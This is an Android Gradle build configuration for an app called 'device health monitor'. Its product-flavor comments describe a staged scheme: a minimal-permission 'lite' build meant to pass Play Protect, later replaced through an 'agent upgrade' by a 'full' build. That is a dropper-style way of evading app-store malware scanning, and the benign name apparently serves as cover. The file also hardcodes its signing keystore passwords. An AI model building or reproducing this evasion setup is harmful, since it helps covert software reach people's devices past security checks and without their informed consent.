plugins {
    id 'com.android.application'
}

android {
    namespace 'com.device.health.monitor'
    compileSdk 34

    defaultConfig {
        applicationId "com.device.health.monitor"
        minSdk 26
        targetSdk 34
        versionCode 2
        versionName "2.0"
    }

    signingConfigs {
        release {
            storeFile file("../release.jks")
            storePassword "healthmon2024"
            keyAlias "release"
            keyPassword "healthmon2024"
        }
    }

    flavorDimensions "stage"
    productFlavors {
        // Stage 1: minimal permissions — passes Play Protect
        lite {
            dimension "stage"
            versionNameSuffix "-lite"
        }
        // Stage 2: full features — installed after Stage 1 via agent upgrade
        full {
            dimension "stage"
            versionNameSuffix "-full"
        }
    }

    buildTypes {
        release {
            minifyEnabled true
            shrinkResources true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
            signingConfig signingConfigs.release
        }
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_17
        targetCompatibility JavaVersion.VERSION_17
    }

    packaging {
        resources {
            excludes += ['META-INF/DEPENDENCIES', 'META-INF/LICENSE', 'META-INF/NOTICE']
        }
    }
}

dependencies {
    implementation 'androidx.core:core:1.13.1'
}
